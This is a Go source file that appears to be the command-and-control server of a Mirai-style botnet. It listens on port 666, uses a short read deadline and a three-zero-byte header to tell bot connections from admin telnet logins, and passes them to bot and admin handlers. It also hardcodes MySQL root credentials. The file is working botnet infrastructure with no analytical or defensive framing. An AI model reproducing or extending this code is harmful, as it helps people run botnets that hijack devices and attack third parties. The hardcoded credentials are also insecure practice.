package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "myrox"
const DatabaseTable string  = "myroxxv0"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp4", "0.0.0.0:666")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := tel.Accept()
        if err != nil {
            fmt.Println(err)
            continue
        }
        fmt.Printf("[!] Connection from %s\n", conn.RemoteAddr().String())
        go initialHandler(conn)
    }
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    // Try a very short read to detect bot handshake without blocking admins
    conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
    header := make([]byte, 4)
    n, err := conn.Read(header)
    // Reset deadline
    conn.SetReadDeadline(time.Time{})

    // If timeout or no data, instantly show admin login
    if err != nil {
        if ne, ok := err.(net.Error); ok && ne.Timeout() {
            NewAdmin(conn).Handle()
            return
        }
        return
    }

    if n == 4 && header[0] == 0x00 && header[1] == 0x00 && header[2] == 0x00 {
        // Read optional source string length
        var source string
        if header[3] > 0 {
            lb := make([]byte, 1)
            conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
            if n, err = conn.Read(lb); err == nil && n == 1 && lb[0] > 0 {
                sb := make([]byte, lb[0])
                if n, err = conn.Read(sb); err == nil && n == int(lb[0]) {
                    source = string(sb)
                }
            }
            conn.SetReadDeadline(time.Time{})
        }
        NewBot(conn, header[3], source).Handle()
        return
    }

    // Not a bot header – treat as admin
    NewAdmin(conn).Handle()
}


func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
